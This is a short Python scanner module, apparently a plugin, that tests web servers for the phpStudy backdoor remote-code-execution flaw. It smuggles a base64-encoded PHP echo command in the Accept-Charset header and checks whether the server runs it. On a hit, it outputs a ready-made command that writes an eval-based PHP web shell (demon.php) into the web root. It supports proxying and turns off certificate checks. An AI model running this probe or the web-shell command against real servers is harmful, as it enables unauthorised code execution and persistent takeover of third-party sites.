#coding=gbk
import requests
import base64
import time
import logging

jg=''
http = ''
https = ''
def dl4(dl):
    global http,https
    http=dl
    https=dl
def cs(url,s_cookie):
        global jg
        global http, https
        try:
            proxies = {'http': http,
                       'https': https}
            headers = {
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'accept-charset': 'ZWNobyAiY29vbG9vU1N1MTIzbCI7',
                'Accept-Encoding': 'gzip,deflate',
                'Connection': 'close',
            }
            logging.captureWarnings(True)
            cc=requests.get(url,cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
            if cc.status_code!=404:
                if 'coolooSSu123l' in cc.text:
                    jg="""[+]存在漏洞 shell写入命令：ECHO ^<?php @eval($_POST[cmd]);?^>>"C:\phpStudy\WWW\demon.php"""
                else:
                    jg='[-]漏洞不存在'
            else:
                jg = '[-]页面不存在'
        except Exception as aaa:
            jg='[-]请求错误\n'+str(aaa)
def jg2():
    global jg
    return '--------------------------------------------------\n[ phpstudy-rce ]\n\n'+ str (jg)
def u2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        cs(url1,s_cookie)
    elif pd=='1':
        cs(url1,s_cookie)